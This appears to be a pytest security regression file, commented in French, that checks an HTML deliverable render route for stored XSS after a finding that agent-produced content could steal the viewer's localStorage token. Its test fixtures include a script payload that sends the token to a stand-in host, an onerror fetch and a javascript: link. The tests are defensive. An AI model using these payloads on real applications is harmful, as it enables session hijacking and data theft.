"""Vague 1 / file A — SEC-10 (rapport Astra L187).

Le rendu React du chat avait ete assaini ; les livrables HTML, non. La route
`GET /api/deliverables/{id}/render` renvoyait le HTML du livrable tel quel, et
le frontend en faisait un `blob:` ouvert **en document de premier niveau dans
l'origine du Studio** : un script issu du livrable lisait `localStorage.token`
et appelait les API au nom du lecteur. Le texte brut etait de surcroit
interpole dans `<pre>{html}</pre>` sans echappement.

Un livrable n'est pas ecrit par le client : il est produit par des agents a
partir d'un brief, donc orientable. Ce n'est pas une frontiere de confiance.

Les assertions portent sur la CHARGE qui sort de la route, pas sur le code de
retour.
"""
import json
from pathlib import Path

import pytest

from app.main import app
from app.models.agent import Agent
from app.models.agent_deliverable import AgentDeliverable
from app.models.execution import Execution
from app.models.project import Project
from app.models.user import User
from app.utils.dependencies import (
    get_current_user,
    get_current_user_from_token_or_header,
)

RACINE = Path(__file__).resolve().parents[2]


def _livrable(db, contenu: str) -> AgentDeliverable:
    agent = Agent(name=f"agent-sec10-{abs(hash(contenu)) % 100000}", description="agent de test")
    db.add(agent)
    db.commit()
    db.refresh(agent)

    user = User(
        email=f"sec10-{abs(hash(contenu)) % 100000}@example.test",
        hashed_password="pas-un-vrai-hash",
        name="SEC10",
        subscription_tier="team",
    )
    db.add(user)
    db.commit()
    db.refresh(user)

    projet = Project(user_id=user.id, name="Projet SEC10")
    db.add(projet)
    db.commit()
    db.refresh(projet)

    execution = Execution(project_id=projet.id, user_id=user.id)
    db.add(execution)
    db.commit()
    db.refresh(execution)

    livrable = AgentDeliverable(
        execution_id=execution.id,
        agent_id=agent.id,
        deliverable_type="sds_document",
        content=contenu,
    )
    db.add(livrable)
    db.commit()
    db.refresh(livrable)

    async def _override():
        return user

    app.dependency_overrides[get_current_user] = _override
    app.dependency_overrides[get_current_user_from_token_or_header] = _override
    return livrable


CHARGE = "<script>fetch('https://exfiltration.test/'+localStorage.token)</script>"


def test_un_script_dans_un_livrable_html_ne_sort_pas_actif(client, db_session):
    livrable = _livrable(
        db_session,
        f"<!DOCTYPE html><html><body><h1>SDS</h1>{CHARGE}</body></html>",
    )
    reponse = client.get(f"/api/deliverables/{livrable.id}/render")
    assert reponse.status_code == 200, reponse.text
    corps = reponse.text
    assert "<script" not in corps.lower(), corps[:500]
    assert "exfiltration.test" not in corps or "&lt;script" in corps


def test_un_gestionnaire_d_evenement_ne_sort_pas_actif(client, db_session):
    livrable = _livrable(
        db_session,
        '<!DOCTYPE html><html><body><img src=x onerror="fetch(\'//exfiltration.test\')">'
        '<a href="javascript:alert(1)">lien</a></body></html>',
    )
    reponse = client.get(f"/api/deliverables/{livrable.id}/render")
    corps = reponse.text.lower()
    assert "onerror" not in corps, reponse.text[:500]
    assert "javascript:" not in corps, reponse.text[:500]


def test_la_charge_enveloppee_en_json_est_assainie_aussi(client, db_session):
    """Le chemin nominal des livrables SDS : {"content": {"raw_html": ...}}."""
    livrable = _livrable(
        db_session,
        json.dumps({"content": {"raw_html": f"<html><body>{CHARGE}</body></html>"}}),
    )
    reponse = client.get(f"/api/deliverables/{livrable.id}/render")
    assert "<script" not in reponse.text.lower(), reponse.text[:500]


def test_le_texte_brut_est_echappe_dans_le_pre(client, db_session):
    """Contenu non HTML : il partait dans `<pre>{html}</pre>` sans echappement."""
    livrable = _livrable(db_session, f"Note libre {CHARGE}")
    reponse = client.get(f"/api/deliverables/{livrable.id}/render")
    assert "<script" not in reponse.text.lower(), reponse.text[:500]
    assert "&lt;script" in reponse.text, reponse.text[:500]


def test_controle_negatif_le_html_legitime_reste_rendu(client, db_session):
    """Sans ce controle, une route qui renverrait du texte vide passerait
    tous les tests precedents."""
    livrable = _livrable(
        db_session,
        "<!DOCTYPE html><html><body><h1>Titre du SDS</h1>"
        '<table><tr><td><strong>BR-001</strong></td></tr></table>'
        '<a href="https://exemple.test/page">reference</a></body></html>',
    )
    reponse = client.get(f"/api/deliverables/{livrable.id}/render")
    corps = reponse.text
    assert "Titre du SDS" in corps
    assert "<h1" in corps and "<table" in corps and "<strong" in corps
    assert 'href="https://exemple.test/page"' in corps


def test_la_reponse_porte_des_entetes_qui_neutralisent_l_execution(client, db_session):
    """Deuxieme barriere : meme si un contenu passait, la reponse ne doit pas
    pouvoir s'executer dans une origine utile."""
    livrable = _livrable(db_session, "<html><body>ok</body></html>")
    reponse = client.get(f"/api/deliverables/{livrable.id}/render")
    csp = reponse.headers.get("content-security-policy", "")
    assert "sandbox" in csp, dict(reponse.headers)
    assert reponse.headers.get("x-content-type-options") == "nosniff"


def test_le_frontend_n_ouvre_plus_le_html_en_document_de_premier_niveau():
    """Astra : « une CSP ajoutee uniquement a la reponse API ne suffit pas si
    le frontend recree ensuite un document Blob ». Assertion de source : le
    depot n'a pas de banc de test frontend (aucun `vitest` dans
    frontend/package.json au 16/09) — mesure, pas exhaustivite."""
    api = (RACINE / "frontend" / "src" / "services" / "api.ts").read_text(encoding="utf-8")
    debut = api.index("async function openAuthenticated")
    fin = api.index("\n}", debut)
    corps = api[debut:fin]
    assert "window.open" not in corps, corps
    assert "location.href" not in corps, corps
